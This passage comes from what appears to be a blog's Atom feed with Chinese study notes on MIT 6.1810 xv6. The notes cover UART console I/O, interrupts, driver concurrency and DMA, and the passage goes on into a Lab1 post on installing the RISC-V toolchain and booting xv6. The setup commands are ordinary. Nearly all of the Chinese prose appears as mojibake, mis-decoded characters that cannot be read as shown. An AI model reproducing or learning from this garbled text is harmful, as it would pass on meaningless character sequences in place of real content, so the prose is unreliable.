è¾“ç¡¬ä»¶å¾ˆå¤§ç¨‹åº¦ä¸Šç‹¬ç«‹äºæ¥æ”¶ç¡¬ä»¶ï¼Œå¦‚æœè½¯ä»¶å‘ THR å†™ 1 Byteï¼ŒUART å°±ä¼ è¾“è¯¥å­—èŠ‚</p><h4 id="xv6-çš„æ§åˆ¶å°è¾“å…¥"><a href="#xv6-çš„æ§åˆ¶å°è¾“å…¥" class="headerlink" title="xv6 çš„æ§åˆ¶å°è¾“å…¥"></a>xv6 çš„æ§åˆ¶å°è¾“å…¥</h4><p>xv6 çš„ <code>main</code> è°ƒç”¨ <code>consoleinit</code> æ¥åˆå§‹åŒ– UART ç¡¬ä»¶ï¼Œé…ç½® UART è®©å®ƒæ¯æ¥æ”¶åˆ° 1 Byte è¾“å…¥å°±ç”Ÿæˆä¸€ä¸ª receive ä¸­æ–­ï¼Œæ¯å®Œæˆ 1 Byte çš„è¾“å‡ºå°±ç”Ÿæˆä¸€ä¸ª transmit complete ä¸­æ–­</p><ul><li>ç”¨æˆ·è¿›ç¨‹ï¼Œå¦‚ shellï¼Œé€šè¿‡ user/init.c æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä½¿ç”¨ <code>read</code> ç³»ç»Ÿè°ƒç”¨ä»æ§åˆ¶å°è·å–è¾“å…¥è¡Œ</li><li><code>read</code> ç³»ç»Ÿè°ƒç”¨é€šè¿‡å†…æ ¸çš„ <code>consoleread</code> å®Œæˆæ“ä½œ</li><li><code>consoleread</code> ç­‰å¾…è¾“å…¥ï¼ˆé€šè¿‡ä¸­æ–­ï¼‰ï¼Œç„¶åå°†å­—ç¬¦æ”¾å…¥ cons.buf ä½œä¸ºç¼“å†²ï¼ŒæŠŠè¾“å…¥å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç›´åˆ°ä¸€æ•´è¡Œè¾“å…¥åˆ°è¾¾ï¼Œè¿”å›åˆ°ç”¨æˆ·è¿›ç¨‹<ul><li>å¦‚æœç”¨æˆ·è¿˜æ²¡æœ‰è¾“å…¥ä¸€æ•´è¡Œï¼Œä»»ä½•éœ€è¦è¯»å–çš„è¿›ç¨‹éƒ½åœ¨ <code>sleep</code> è°ƒç”¨ä¸­ç­‰å¾…</li></ul></li></ul><p>å½“ç”¨æˆ·è¾“å…¥ä¸€ä¸ªå­—ç¬¦</p><ul><li>UART ç¡¬ä»¶è¯·æ±‚ RISC-V å‘èµ·ä¸­æ–­ï¼Œæ¿€æ´» xv6 çš„ trap å¤„ç†ç¨‹åº</li><li>trap å¤„ç†ç¨‹åºä¼šè°ƒç”¨ <code>devintr</code>ï¼Œä» scause å¯„å­˜å™¨æŸ¥æ‰¾ä¸­æ–­æ¥è‡ªå“ªä¸ªå¤–éƒ¨è®¾å¤‡ï¼Œç„¶åå‘Šè¯‰ PLIC ç¡¬ä»¶å•å…ƒå“ªä¸ªè®¾å¤‡å‘å‡ºä¸­æ–­ï¼Œå¦‚æœæ¥è‡ª UARTï¼Œ<code>devintr</code> ä¼šè°ƒç”¨ <code>uartintr</code></li><li><code>uartintr</code> è¯»å–æ¥è‡ª UART ç¡¬ä»¶çš„ç­‰å¾…è¾“å…¥çš„å­—ç¬¦ï¼ˆRHRï¼‰ï¼Œå°†å®ƒä»¬ä¼ ç»™ <code>consoleintr</code></li><li><code>consoleintr</code> ä¼šå°†å­—ç¬¦ç§¯ç´¯åœ¨ cons.bufï¼Œä½†å¯¹ backspace å’Œä¸€äº›å…¶ä»–å­—ç¬¦ç‰¹æ®Šå¤„ç†</li><li>å½“ä¸€è¡Œæ–°çš„å­—ç¬¦åˆ°è¾¾ï¼ˆè¯»å–åˆ° â€˜\nâ€™ï¼‰æ—¶ï¼Œ<code>consoleintr</code> ä¼šå”¤é†’ä¸€ä¸ªæ­£åœ¨ç­‰ç€ç­‰å¾…çš„ <code>consoleread</code></li></ul><h3 id="ä»£ç ï¼šæ§åˆ¶å°è¾“å‡º"><a href="#ä»£ç ï¼šæ§åˆ¶å°è¾“å‡º" class="headerlink" title="ä»£ç ï¼šæ§åˆ¶å°è¾“å‡º"></a>ä»£ç ï¼šæ§åˆ¶å°è¾“å‡º</h3><p>è®¾å¤‡ driver ç»´æŠ¤ä¸€ä¸ªè¾“å…¥ç¼“å†²åŒº uart_tx_bufï¼Œå› æ­¤éœ€è¦è¾“å‡ºçš„è¿›ç¨‹ä¸éœ€è¦ç­‰å¾… UART å®Œæˆå‘é€ï¼Œé™¤éç¼“å†²åŒºå·²æ»¡</p><ul><li><code>write</code> ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨è¿æ¥ç€æ§åˆ¶å°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæœ€ç»ˆä¼šåˆ°è¾¾ <code>uartputc</code></li><li><code>uartputc</code> å°†æ¯ä¸ªå­—ç¬¦åŠ å…¥ç¼“å†²åŒºï¼Œè°ƒç”¨ <code>uartstart</code> å¼€å§‹è®¾å¤‡ä¼ è¾“å¹¶è¿”å›</li></ul><p>UART æ¯å®Œæˆä¸€ä¸ªå­—èŠ‚çš„å‘é€ï¼Œå°±ä¼šå‘èµ·ä¸­æ–­ï¼Œ<code>uartintr</code> è°ƒç”¨ <code>uartstart</code> æ£€æŸ¥è®¾å¤‡æ˜¯å¦å·²ç»å®Œæˆå‘é€ï¼Œç„¶åå°†ä¸‹ä¸€ä¸ªç¼“å†²çš„è¾“å‡ºå­—ç¬¦ä¼ ç»™è®¾å¤‡</p><p>å¦‚æœä¸€ä¸ªè¿›ç¨‹å°†å¤šä¸ªå­—èŠ‚å†™å…¥æ§åˆ¶å°ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¼šç”± <code>uartputc</code> è°ƒç”¨çš„ <code>uartstart</code> æ¥å‘é€ï¼Œå‰©ä¸‹çš„å­—èŠ‚ç”± <code>uartintr</code> è°ƒç”¨çš„ <code>uartstart</code> æ¥å‘é€</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œé€šè¿‡ç¼“å†²å’Œä¸­æ–­å°†è®¾å¤‡æ´»åŠ¨å’Œè¿›ç¨‹æ´»åŠ¨è¿›è¡Œè§£è€¦</p><p>æ§åˆ¶å° driver å¯ä»¥å¤„ç†è¾“å…¥ï¼Œå³ä½¿æ²¡æœ‰è¿›ç¨‹ç­‰å¾…è¯»å–ï¼Œä¸€ä¸ªåæ¥çš„è¯»å–å¯ä»¥çœ‹åˆ°è¾“å…¥ï¼›è¿›ç¨‹å¯ä»¥ä¸ç­‰å¾…è®¾å¤‡å‘é€è¾“å‡º</p><p>è§£è€¦é€šè¿‡å…è®¸è¿›ç¨‹ä¸è®¾å¤‡ I/O åŒæ—¶æ‰§è¡Œæ¥æé«˜æ€§èƒ½ï¼Œå½“è®¾å¤‡é€Ÿåº¦æ…¢ï¼ˆå¦‚ UARTï¼‰æˆ–éœ€è¦å³æ—¶å“åº”ï¼ˆå¦‚å›åº”é”®å…¥çš„å­—ç¬¦ï¼‰æ—¶å°¤å…¶é‡è¦</p><p>è¿™ä¹Ÿè¢«ç§°ä¸º I/O å¹¶è¡Œ</p><h3 id="é©±åŠ¨ç¨‹åºä¸­çš„å¹¶å‘"><a href="#é©±åŠ¨ç¨‹åºä¸­çš„å¹¶å‘" class="headerlink" title="é©±åŠ¨ç¨‹åºä¸­çš„å¹¶å‘"></a>é©±åŠ¨ç¨‹åºä¸­çš„å¹¶å‘</h3><p>ä½ å¯èƒ½æ³¨æ„åˆ°åœ¨ <code>consoleread</code> å’Œ <code>consoleintr</code> ä¸­è°ƒç”¨ <code>acquire</code></p><p>è¿™ä¸ªè°ƒç”¨ç”³è¯·ä¸€ä¸ªğŸ”’ï¼Œä¿æŠ¤æ§åˆ¶å° driver çš„æ•°æ®ç»“æ„å…å—å¹¶å‘è®¿é—®å½±å“</p><p>ä¸‰ä¸ªå¹¶å‘å±é™©ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç«äº‰æˆ–æ­»é”</p><ul><li>ä¸¤ä¸ªåœ¨ä¸åŒ CPU æ ¸çš„è¿›ç¨‹åŒæ—¶è°ƒç”¨ <code>consoleread</code></li><li>å½“ CPU æ­£åœ¨æ‰§è¡Œ <code>consoleread</code> æ—¶ï¼Œç¡¬ä»¶å¯èƒ½è¯·æ±‚è¯¥ CPU å‘é€æ§åˆ¶å°ä¸­æ–­</li><li>å½“ CPU æ­£åœ¨æ‰§è¡Œ <code>consoleread</code> æ—¶ï¼Œç¡¬ä»¶å¯èƒ½åœ¨å¦ä¸€ä¸ª CPU ä¸­å‘é€æ§åˆ¶å°ä¸­æ–­</li></ul><p>drivers çš„å¹¶å‘å¦ä¸€ä¸ªéœ€è¦å°å¿ƒçš„åœ°æ–¹ï¼šä¸€ä¸ªè¿›ç¨‹å¯èƒ½ç­‰å¾…è®¾å¤‡è¾“å…¥ï¼Œå½“å¦ä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œæ—¶ï¼Œè¾“å…¥çš„ä¸­æ–­ä¿¡å·å¯èƒ½åˆ°è¾¾</p><p>ä¸­æ–­å¤„ç†ç¨‹åºä¸ä¼šè€ƒè™‘ä¸­æ–­çš„è¿›ç¨‹å’Œä»£ç ï¼Œä¾‹å¦‚ä¸€ä¸ªä¸­æ–­å¤„ç†ç¨‹åºæ— æ³•å®‰å…¨åœ°ä½¿ç”¨å½“å‰è¿›ç¨‹çš„é¡µè¡¨è°ƒç”¨ <code>copyout</code>ï¼Œå®ƒåªä¼šåšå¾ˆå°‘é‡çš„å·¥ä½œï¼ˆå¦‚ï¼Œå°†è¾“å…¥æ•°æ®å¤åˆ¶åˆ°ç¼“å†²åŒºï¼‰ï¼Œå¹¶å”¤é†’å‰åŠéƒ¨åˆ†ä»£ç å®Œæˆå…¶ä½™å·¥ä½œ</p><h3 id="å®šæ—¶å™¨ä¸­æ–­"><a href="#å®šæ—¶å™¨ä¸­æ–­" class="headerlink" title="å®šæ—¶å™¨ä¸­æ–­"></a>å®šæ—¶å™¨ä¸­æ–­</h3><p>Xv6 ä½¿ç”¨å®šæ—¶å™¨ä¸­æ–­ç»´æŒæ—¶é’Ÿï¼Œä½¿å…¶èƒ½åœ¨è¿›ç¨‹ä¹‹é—´åˆ‡æ¢è¿›è¡Œè°ƒåº¦</p><p><code>usertrap</code> å’Œ <code>kerneltrap</code> ä¸­çš„ <code>yield</code> è°ƒç”¨ä¹Ÿä¼šå¯¼è‡´è¿™ç±»åˆ‡æ¢</p><p>å®šæ—¶å™¨ä¸­æ–­æ¥è‡ª RISC-V ä¸­æ¯ä¸ª CPU çš„æ—¶é’Ÿç¡¬ä»¶ï¼Œxv6 å¯¹è¿™ä¸ªæ—¶é’Ÿç¡¬ä»¶ç¼–ç¨‹ï¼Œä»¥å®šæœŸä¸­æ–­æ¯ä¸ª CPU</p><p>RISC-V è¦æ±‚è®¡æ—¶å™¨ä¸­æ–­è¦ç”±æœºå™¨æ¨¡å¼æ¥ç®¡ï¼Œè€Œä¸æ˜¯ç®¡ç†è€…æ¨¡å¼</p><p>RISC-V æœºå™¨æ¨¡å¼ä¸ç”¨åˆ†é¡µæ‰§è¡Œä»£ç ï¼Œä½¿ç”¨ä¸€ç»„ç‹¬ç«‹çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œå› æ­¤åœ¨æœºå™¨æ¨¡å¼æ‰§è¡Œæ™®é€šçš„ xv6 å†…æ ¸ä»£ç æ—¶æ˜¯ä¸å®é™…çš„</p><p>å› æ­¤ xv6 å°†å®šæ—¶å™¨ä¸­æ–­ç‹¬ç«‹äºä¹‹å‰ä½¿ç”¨çš„ trap æœºåˆ¶è¿›è¡Œå¤„ç†</p><p>æœºå™¨æ¨¡å¼æ‰§è¡Œçš„ä»£ç åœ¨ kernel/start.c ä¸­ï¼Œåœ¨æ‰§è¡Œ <code>main</code> ä¹‹å‰ï¼Œè®¾ç½®å®šæ—¶å™¨ä¸­æ–­çš„æ¥æ”¶</p><ul><li>å¯¹ CLINTï¼ˆcore-local interruptorï¼‰ç¡¬ä»¶è¿›è¡Œç¼–ç¨‹ï¼Œä»¥åœ¨ä¸€å®šå»¶è¿Ÿåç”Ÿæˆä¸­æ–­</li><li>è®¾ç«‹ä¸€ä¸ªç±»ä¼¼ trapframe çš„ä¸´æ—¶åŒºåŸŸï¼Œå¸®åŠ©å®šæ—¶å™¨ä¸­æ–­å¤„ç†ç¨‹åºä¿å­˜å¯„å­˜å™¨å’Œ CLINT å¯„å­˜å™¨çš„åœ°å€</li><li>æœ€å <code>start</code> å°† mtvec è®¾ç½®ä¸º <code>timervec</code>ï¼ˆåœ¨ kernel/kernelvec.S ä¸­ï¼‰ï¼Œå¯ç”¨å®šæ—¶å™¨ä¸­æ–­</li></ul><h3 id="çœŸå®ä¸–ç•Œ-3"><a href="#çœŸå®ä¸–ç•Œ-3" class="headerlink" title="çœŸå®ä¸–ç•Œ"></a>çœŸå®ä¸–ç•Œ</h3><p>xv6 å…è®¸åœ¨æ‰§è¡Œå†…æ ¸å’Œç”¨æˆ·ç¨‹åºæ—¶å¯ç”¨è®¾å¤‡å’Œå®šæ—¶å™¨ä¸­æ–­</p><p>å®šæ—¶å™¨ä¸­æ–­å¼ºåˆ¶çº¿ç¨‹åˆ‡æ¢ï¼Œå³ä½¿æ˜¯åœ¨å†…æ ¸æ€è¿è¡Œï¼Œå› æ­¤å†…æ ¸ä»£ç éœ€è¦æ³¨æ„å®ƒå¯èƒ½è¢«æŒ‚èµ·ï¼Œå¹¶åœ¨ä¸åŒçš„ CPU ä¸Šæ¢å¤</p><p>å¦‚æœå†…æ ¸çº¿ç¨‹æœ‰æ—¶èŠ±è´¹å¤§é‡æ—¶é—´è®¡ç®—è€Œä¸è¿”å›ç”¨æˆ·ç©ºé—´ï¼Œåœ¨å†…æ ¸çº¿ç¨‹ä¹‹é—´å…¬å¹³åœ°å¯¹ CPU è¿›è¡Œæ—¶é—´åˆ‡ç‰‡æ˜¯æœ‰æ•ˆçš„</p><p>å¦‚æœåªåœ¨æ‰§è¡Œç”¨æˆ·ä»£ç æ—¶å‘ç”Ÿè®¾å¤‡å’Œå®šæ—¶å™¨ä¸­æ–­ï¼Œä¼šè®©å†…æ ¸æ›´ç®€å•</p><p>åœ¨ä¸€å°è®¡ç®—æœºä¸Šæ”¯æŒæ‰€æœ‰è®¾å¤‡æ˜¯ä¸€é¡¹è‰°å·¨çš„å·¥ä½œï¼Œå› ä¸ºæœ‰è®¸å¤šè®¾å¤‡ï¼Œæœ‰è®¸å¤šåŠŸèƒ½ï¼Œè®¾å¤‡å’Œ driver ä¹‹é—´çš„åè®®å¯èƒ½å¾ˆå¤æ‚ä¸”ç¼ºä¹æ–‡æ¡£ã€‚åœ¨è®¸å¤šæ“ä½œç³»ç»Ÿä¸­ï¼Œdriver æ¯”å†…æ ¸æ ¸å¿ƒä»£ç å ç”¨æ›´å¤š</p><p>UART driver é€šè¿‡è¯»å– UART æ§åˆ¶å¯„å­˜å™¨ä¸€æ¬¡æ£€ç´¢ 1 Byte çš„æ•°æ®ï¼Œç§°ä¸º programmed I/Oï¼Œå› ä¸ºè½¯ä»¶æ­£åœ¨é©±åŠ¨æ•°æ®ç§»åŠ¨</p><h4 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h4><ul><li>ç¼–ç¨‹ I/O å¾ˆç®€å•ï¼Œä½†æ˜¯é€Ÿåº¦å¤ªæ…¢ï¼Œæ— æ³•åœ¨é«˜æ•°æ®é€Ÿç‡ä¸‹ä½¿ç”¨</li><li>xv6 çš„ UART driver å…ˆå°†ä¼ å…¥çš„æ•°æ®å¤åˆ¶åˆ°å†…æ ¸çš„ç¼“å†²åŒºï¼Œå†å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œåœ¨ä½æ•°æ®é€Ÿç‡æ—¶æœ‰æ•ˆï¼Œä½†å¦‚æœè®¾å¤‡äº§ç”Ÿæˆ–ä½¿ç”¨æ•°æ®å¾ˆå¿«ï¼Œä¸¤æ¬¡å¤åˆ¶ä¼šä¸¥é‡é™ä½æ€§èƒ½</li></ul><p>å› æ­¤æœ‰ç›´æ¥å­˜å‚¨å™¨è®¿é—®ï¼ˆDMAï¼‰æŠ€æœ¯</p><ul><li>DMA ç¡¬ä»¶è®¾å¤‡ç›´æ¥å°†ä¼ å…¥çš„æ•°æ®å†™å…¥ RAMï¼Œå¹¶ä» RAM è¯»å–ä¼ å‡ºçš„æ•°æ®</li><li>é«˜é€Ÿç§»åŠ¨å¤§é‡æ•°æ®çš„è®¾å¤‡ï¼ˆç°ä»£ç£ç›˜å’Œç½‘ç»œè®¾å¤‡ï¼‰é€šå¸¸ä½¿ç”¨ç›´æ¥å­˜å‚¨å™¨è®¿é—®ï¼ˆDMAï¼‰</li></ul><p>ä¸€äº›æ“ä½œç³»ç»Ÿå¸¸ä½¿ç”¨ DMA ç›´æ¥å°†æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºå’Œè®¾å¤‡ç¡¬ä»¶ä¹‹é—´ç§»åŠ¨</p><p>DMA è®¾å¤‡ driver åœ¨ RAM ä¸­å‡†å¤‡æ•°æ®ï¼Œå¯¹ä¸€ä¸ªæ§åˆ¶å¯„å­˜å™¨è¿›è¡Œä¸€æ¬¡å†™å…¥å‘Šè¯‰è®¾å¤‡å»å¤„ç†å‡†å¤‡å¥½çš„æ•°æ®</p><h4 id="ä¸­æ–­ä¼˜åŒ–"><a href="#ä¸­æ–­ä¼˜åŒ–" class="headerlink" title="ä¸­æ–­ä¼˜åŒ–"></a>ä¸­æ–­ä¼˜åŒ–</h4><p>å½“ä¸€ä¸ªè®¾å¤‡åœ¨ä¸å¯é¢„æµ‹çš„æ—¶é—´éœ€è¦å…³æ³¨æ—¶ï¼Œä¸­æ–­æ˜¯æœ‰æ„ä¹‰çš„ï¼Œä½†æ˜¯ä¸­æ–­æœ‰å¾ˆé«˜çš„ CPU å¼€é”€</p><p>é«˜é€Ÿè®¾å¤‡ï¼ˆå¦‚ç½‘ç»œå’Œç£ç›˜æ§åˆ¶å™¨ï¼‰ä½¿ç”¨ä¸€äº›æŠ€å·§å‡å°‘ä¸­æ–­çš„éœ€æ±‚</p><ul><li>å¯¹æ•´æ‰¹ä¼ å…¥æˆ–ä¼ å‡ºçš„è¯·æ±‚å‘èµ·ä¸€ä¸ªä¸­æ–­</li><li>è½®è¯¢ï¼šå®Œå…¨ç¦ç”¨ä¸­æ–­ï¼Œå®šæœŸæ£€æŸ¥è®¾å¤‡æ˜¯å¦éœ€è¦å…³æ³¨</li></ul><p>å¦‚æœè®¾å¤‡æ‰§è¡Œæ“ä½œéå¸¸å¿«ï¼Œè½®è¯¢æ•ˆç‡è¾ƒé«˜ï¼Œä½†æ˜¯å¦‚æœè®¾å¤‡å¤§éƒ¨åˆ†æ—¶é—´å¤„äºç©ºé—²çŠ¶æ€ï¼Œåˆ™ä¼šæµªè´¹ CPU æ—¶é—´</p><p>æŸäº›é©±åŠ¨ç¨‹åºæ ¹æ®å½“å‰è®¾å¤‡è´Ÿè½½ä¼šåœ¨è½®è¯¢å’Œä¸­æ–­ä¹‹é—´åŠ¨æ€åˆ‡æ¢</p><h4 id="è®¾å¤‡ä½¿ç”¨"><a href="#è®¾å¤‡ä½¿ç”¨" class="headerlink" title="è®¾å¤‡ä½¿ç”¨"></a>è®¾å¤‡ä½¿ç”¨</h4><p>å¦‚ç¬¬ 1 ç« æ‰€è¿°ï¼Œæ§åˆ¶å°åœ¨åº”ç”¨ç¨‹åºå‘ˆç°ä¸ºä¸€ä¸ªå¸¸è§„æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡ <code>read</code> å’Œ <code>write</code> ç³»ç»Ÿè°ƒç”¨è¯»å–è¾“å…¥ï¼Œå†™å…¥è¾“å‡º</p><p>åº”ç”¨ç¨‹åºå¯èƒ½æƒ³è¦æ§åˆ¶ä¸èƒ½ä½œä¸ºæ ‡å‡†æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨çš„è®¾å¤‡ï¼ŒUnix æ“ä½œç³»ç»Ÿæ”¯æŒ ioctl ç³»ç»Ÿè°ƒç”¨åº”å¯¹è¿™ç§æƒ…å†µ</p><h4 id="å®æ—¶å“åº”"><a href="#å®æ—¶å“åº”" class="headerlink" title="å®æ—¶å“åº”"></a>å®æ—¶å“åº”</h4><p>è®¡ç®—æœºçš„ä¸€äº›ä½¿ç”¨éœ€è¦ç³»ç»Ÿåœ¨æœ‰é™çš„æ—¶é—´å†…åšå‡ºå“åº”ï¼ˆä¸¥æ ¼å®‰å…¨çš„ç³»ç»Ÿé”™è¿‡ deadline å¯èƒ½ä¼šå¯¼è‡´ç¾éš¾ï¼‰</p><p>xv6 ä¸é€‚åˆä¸¥æ ¼å®æ—¶è®¾ç½®ï¼Œä¸¥æ ¼å®æ—¶æ“ä½œç³»ç»Ÿå¾€å¾€æ˜¯ä¸åº”ç”¨ç¨‹åºé“¾æ¥çš„åº“ï¼Œå…è®¸è¿›è¡Œåˆ†ææœ€åæƒ…å†µä¸‹çš„å“åº”æ—¶é—´</p><p>xv6 ä¹Ÿä¸é€‚åˆè½¯å®æ—¶åº”ç”¨ç¨‹åºï¼Œå¶å°”é”™è¿‡ deadline æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå› ä¸º xv6 è°ƒç”¨ç¨‹åºè¿‡äºç®€å•ï¼Œå¹¶ä¸”å®ƒåœ¨å†…æ ¸ä»£ç è·¯å¾„ä¸­æœ‰ä¸€æ®µè¾ƒé•¿æ—¶é—´ä¸­æ–­æ˜¯ç¦æ­¢çš„</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡æ˜¯ç¬”è€…åœ¨å­¦ä¹  MIT 6.1810 2022 Fall é˜…è¯» xv6 æ–‡æ¡£æ—¶æ‰€å†™ï¼Œå¤§éƒ¨åˆ†æ˜¯å°†åŸæ–‡ç¿»è¯‘ï¼Œç¬”è€…å°½å¯èƒ½åŠ å…¥è‡ªå·±çš„ç†è§£å¹¶æ’ç‰ˆï¼Œ&lt;del&gt;åº”è¯¥ä¼š&lt;/del&gt;æŒç»­æ›´æ–°ç›´åˆ°æ–‡æ¡£è¯»å®Œ&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab1 Xv6 and Unix utilities</title>
    <link href="https://humoooor.cn/2022/10/13/Lab1_Xv6_and_Unix_utilities/"/>
    <id>https://humoooor.cn/2022/10/13/Lab1_Xv6_and_Unix_utilities/</id>
    <published>2022-10-13T11:47:00.000Z</published>
    <updated>2023-05-23T03:38:06.116Z</updated>
    
    <content type="html"><![CDATA[<p>å¼€å­¦ï¼</p><span id="more"></span><h2 id="å¯åŠ¨-xv6"><a href="#å¯åŠ¨-xv6" class="headerlink" title="å¯åŠ¨ xv6"></a>å¯åŠ¨ xv6</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2022</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ git æ—¥å¿—</span></span><br><span class="line">git status</span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨äºè·å–å®éªŒæ‰€éœ€æ–‡ä»¶</span></span><br><span class="line">git checkout util</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å®Œæˆä¸€ä¸ªå®éªŒå¹¶æƒ³è¦æ£€è®°å½•è¿›åº¦å¯ä½¿ç”¨ git commit</span></span><br><span class="line">git commit -am <span class="string">&#x27;my solution for util lab exercise 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># æŸ¥çœ‹ç›¸æ¯”ä¸Šä¸€æ¬¡ commit çš„å˜åŒ–</span></span><br><span class="line"><span class="string">git diff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># æŸ¥çœ‹ç›¸æ¯”æœ€åˆçš„å˜åŒ–</span></span><br><span class="line"><span class="string">git diff origin/util</span></span><br></pre></td></tr></table></figure><h3 id="å»ºç«‹å¹¶è¿è¡Œ-xv6"><a href="#å»ºç«‹å¹¶è¿è¡Œ-xv6" class="headerlink" title="å»ºç«‹å¹¶è¿è¡Œ xv6"></a>å»ºç«‹å¹¶è¿è¡Œ xv6</h3><ul><li><p><code>make qemu</code></p><ul><li><p>ç¬¬ä¸€æ­¥å°±å‡ºé”™äº†ã€‚ã€‚ã€‚</p><ul><li><code>Error: Couldn&#39;t find a riscv64 version of GCC/binutils.</code></li><li>ç¼ºå°‘ RISC-V ç›¸å…³çš„ GCC/binutils</li><li>æœç´¢ binutils <code>apt search binutils | grep riscv64</code></li><li>å®‰è£…ç¬¬ä¸€ä¸ªå³å¯</li><li><code>sudo apt install binutils-riscv64-linux-gnu</code></li></ul></li><li><p>æ¥ç€æ˜¯å¦ä¸€ä¸ªæŠ¥é”™</p><ul><li><code>riscv64-linux-gnu-gcc    -c -o kernel/entry.o kernel/entry.S</code></li><li><code>make: riscv64-linux-gnu-gcc: No such file or directory</code></li><li><code>make: *** [\&lt;builtin\&gt;: kernel/entry.o] Error 127</code></li><li>å®‰è£…å¯¹åº”çš„ gcc <code>sudo apt install gcc-10-riscv64-linux-gnu</code></li><li>è¿›å…¥ /usr/bin ç›®å½•ï¼Œå»ºç«‹è½¯é“¾æ¥</li><li><code>sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc</code></li></ul></li><li><p>åé¢åˆæ˜¯ç¼ºå°‘ä»€ä¹ˆæ–‡ä»¶ï¼Œå»ç¿»äº†ç¿» lab ä»‹ç»ï¼Œå‘ç°å·²ç»ç»™äº†å·¥å…·é“¾æ¥ <a href="https://pdos.csail.mit.edu/6.828/2022/tools.html">lab tools page</a></p><ul><li><code>sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</code></li><li>è¿™é‡Œçš„ gcc-riscv64-linux-gnu ä¸‹è½½çš„æ˜¯ gcc-11ï¼Œè¦å†ä¸‹å› gcc-10ï¼Œä¸ç„¶ä¼šæŠ¥é”™</li><li><code>sudo apt install gcc-10-riscv64-linux-gnu</code></li><li><code>cd /usr/bin; sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc</code></li><li>ç»“æœä¸€æ°”å‘µæˆ~</li></ul></li></ul></li></ul><p>é‡Œé¢æœ‰ä¸€äº›å¾ˆåŸºæœ¬çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xv6 kernel is booting</span><br><span class="line"></span><br><span class="line">hart 1 starting</span><br><span class="line">hart 2 starting</span><br><span class="line">init: starting sh</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">.              1 1 1024</span><br><span class="line">..             1 1 1024</span><br><span class="line">README         2 2 2227</span><br><span class="line">xargstest.sh   2 3 93</span><br><span class="line"><span class="built_in">cat</span>            2 4 32832</span><br><span class="line"><span class="built_in">echo</span>           2 5 31728</span><br><span class="line">forktest       2 6 15680</span><br><span class="line">grep           2 7 36176</span><br><span class="line">init           2 8 32152</span><br><span class="line"><span class="built_in">kill</span>           2 9 31712</span><br><span class="line"><span class="built_in">ln</span>             2 10 31520</span><br><span class="line"><span class="built_in">ls</span>             2 11 34728</span><br><span class="line"><span class="built_in">mkdir</span>          2 12 31784</span><br><span class="line"><span class="built_in">rm</span>             2 13 31768</span><br><span class="line">sh             2 14 53960</span><br><span class="line">stressfs       2 15 32496</span><br><span class="line">usertests      2 16 181776</span><br><span class="line">grind          2 17 47696</span><br><span class="line"><span class="built_in">wc</span>             2 18 33832</span><br><span class="line">zombie         2 19 31168</span><br><span class="line">console        3 20 0</span><br></pre></td></tr></table></figure><p>-<del>ç”šè‡³éƒ½æ²¡æœ‰ clear</del></p><p>Ctrl-p æ‰“å°è¿›ç¨‹ä¿¡æ¯</p><p>Ctrl-a x é€€å‡º 